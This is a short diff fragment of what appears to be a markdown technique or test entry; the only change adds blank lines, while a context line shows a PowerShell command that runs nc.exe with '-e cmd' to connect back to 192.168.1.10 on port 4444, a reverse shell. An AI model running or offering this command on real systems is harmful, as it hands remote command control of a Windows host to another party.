@@ -18,3 +18,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -C "C:\Windows\Temp\nc.exe -e cmd 192.168.1.10 4444"
 
 ```
+
+
